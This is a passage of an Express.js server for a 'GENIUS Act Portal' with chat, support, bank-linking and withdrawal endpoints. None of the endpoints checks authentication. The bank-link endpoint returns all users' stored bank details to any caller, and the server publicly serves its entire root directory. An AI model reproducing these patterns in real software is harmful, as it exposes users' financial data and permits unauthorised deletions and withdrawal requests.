      targetChat.lastUpdated = new Date().toISOString();
      targetChat.unreadUserCount = (targetChat.unreadUserCount || 0) + 1;
      targetChat.unreadAdminCount = 0;
    } else {
      targetChat = {
        chatId: chatId || ('chat_' + Date.now()),
        userEmail: userEmail || (String(chatId).includes('@') ? chatId : 'visitor@geniusact.org'),
        userName: userEmail ? userEmail.split('@')[0] : 'Visitor',
        isGuest: true,
        lastUpdated: new Date().toISOString(),
        unreadUserCount: 1,
        unreadAdminCount: 0,
        messages: [message]
      };
      chats.push(targetChat);
    }

    currentDb['geniusact_contact_chats'] = mergeContactChatsServer(chats, [targetChat]);
    saveCloudDb(currentDb);
    return res.json({ success: true, chats: currentDb['geniusact_contact_chats'] });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/chat/delete', (req, res) => {
  try {
    const { chatId } = req.body || {};
    if (!chatId) return res.status(400).json({ error: 'chatId required' });
    const currentDb = getCloudDb();
    let chats = currentDb['geniusact_contact_chats'] || [];
    chats = chats.filter(c => c.chatId !== chatId && c.userEmail !== chatId);
    currentDb['geniusact_contact_chats'] = chats;
    saveCloudDb(currentDb);
    return res.json({ success: true, chats });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/support/message', (req, res) => {
  try {
    const msg = req.body;
    if (!msg || !msg.message) return res.status(400).json({ error: 'Message content is required' });
    const currentDb = getCloudDb();
    const msgs = currentDb['geniusact_support_messages'] || [];
    if (!msg.id) msg.id = 'sup_' + Date.now();
    if (!msg.timestamp) msg.timestamp = new Date().toISOString();
    msgs.unshift(msg);
    currentDb['geniusact_support_messages'] = msgs;
    saveCloudDb(currentDb);
    return res.json({ success: true, support_messages: currentDb['geniusact_support_messages'] });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------
// Bank Link & Withdrawal Endpoints
// ---------------------------------------------------------------------
app.post('/api/bank/link', (req, res) => {
  try {
    const bankData = req.body;
    if (!bankData || !bankData.userEmail || !bankData.bankName) {
      return res.status(400).json({ error: 'Valid bank details required.' });
    }
    const currentDb = getCloudDb();
    const links = currentDb['geniusact_bank_links'] || [];
    const cleanEmail = String(bankData.userEmail).trim().toLowerCase();

    const existingIdx = links.findIndex(l => l.userEmail && l.userEmail.toLowerCase() === cleanEmail);
    if (existingIdx > -1) {
      links[existingIdx] = { ...links[existingIdx], ...bankData, linkedAt: new Date().toISOString() };
    } else {
      if (!bankData.id) bankData.id = 'LINK-' + Date.now();
      bankData.linkedAt = new Date().toISOString();
      links.unshift(bankData);
    }
    currentDb['geniusact_bank_links'] = links;
    saveCloudDb(currentDb);
    return res.json({ success: true, bank_links: links });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/withdraw/request', (req, res) => {
  try {
    const reqData = req.body;
    if (!reqData || !reqData.userEmail || !reqData.amount) {
      return res.status(400).json({ error: 'Email and amount required.' });
    }
    const currentDb = getCloudDb();
    const reqs = currentDb['geniusact_withdrawal_requests'] || [];
    if (!reqData.id) reqData.id = 'WDR-' + Date.now();
    if (!reqData.timestamp) reqData.timestamp = new Date().toISOString();
    reqData.status = 'pending';
    reqs.unshift(reqData);
    currentDb['geniusact_withdrawal_requests'] = reqs;
    saveCloudDb(currentDb);
    return res.json({ success: true, withdrawal_requests: reqs });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------
// Page Routing & Static File Serving
// ---------------------------------------------------------------------
app.get('/', (req, res) => {
  res.redirect('/index.html');
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Serve static files from root directory
app.use(express.static(__dirname));
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use('/static', express.static(path.join(__dirname, 'static')));

// Catch-all 404 handler for unknown routes
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[Server] GENIUS Act Portal running on http://0.0.0.0:${PORT}`);
});
